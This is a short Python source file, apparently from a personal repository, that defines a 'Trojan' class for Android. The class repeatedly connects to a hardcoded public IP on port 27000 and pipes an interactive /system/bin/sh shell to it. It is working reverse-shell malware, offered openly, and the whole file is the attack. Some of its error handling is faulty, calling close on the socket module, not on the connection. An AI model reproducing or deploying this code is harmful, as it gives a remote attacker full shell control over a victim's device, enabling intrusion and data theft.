
# see the readme file of my repository for clear visual of the project
import logging
import socket, subprocess, os,time
import tracemalloc

tracemalloc.start()

host = '3.110.37.124' #this is a public server IP
port = 27000 #this can be any port, here I have chosen 27000
interval = 10 #reconnection interval
timeout=30 #timeout time to restart connection

class Trojan:
    def __init__(self, host, port):
        self._host = host
        self._port = port
        self._socket = None

    @property
    def host(self):
        return self._host

    @host.setter
    def host(self, new_host):
        self._host = new_host

    @property
    def port(self):
        return self._port

    @port.setter
    def port(self, new_port):
        self._port = new_port

    @property
    def socket(self):
        return self._socket

    def connect_to_server(self):
        while True:
            time.sleep(interval)
            try:
                if not self.socket:
                    print("Attempting to connect to server")
                    self._socket=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    self.socket.connect((self.host, self.port))
                    self._socket.settimeout(timeout)
                    print("Connected to server successfully")
                self.interactive_shell()
            except (socket.error, socket.timeout) as e:
                print(f'Connection attempt failed: {e}')
                socket.close()
                self._socket = None
                continue

            except Exception as e:
                print(f'Error in connect_to_server: {e}')
                socket.close()
                self._socket = None
                continue

            finally:
                self.socket.close()
                self._socket = None
                continue
    # main program which will give the android shell as a reverse shell
    def interactive_shell(self):
        try:
            env = os.environ.copy()
            if env: env.clear()
            # reverse shell in python
            subprocess.call(["/system/bin/sh", "-i"],env=env, stdin=self._socket.fileno(), stdout=self._socket.fileno(), stderr=self._socket.fileno())
        except (BrokenPipeError, socket.timeout,socket.error, OSError) as e:
            print(f'Error: {e}')
            self._socket = None
            return
        except socket.timeout as t:
            print(f"Timeout...Trying again {t}")
            self._socket = None
            return
        finally:
            self.socket.close()
            self._socket = None



if __name__ == '__main__':
    logging.basicConfig(level=logging.DEBUG)
    trojan = Trojan(host, port)
    trojan.connect_to_server()


# in this code, everything is just error handling. Only thing is the reverse shell code which a hacker need to have some idea about it
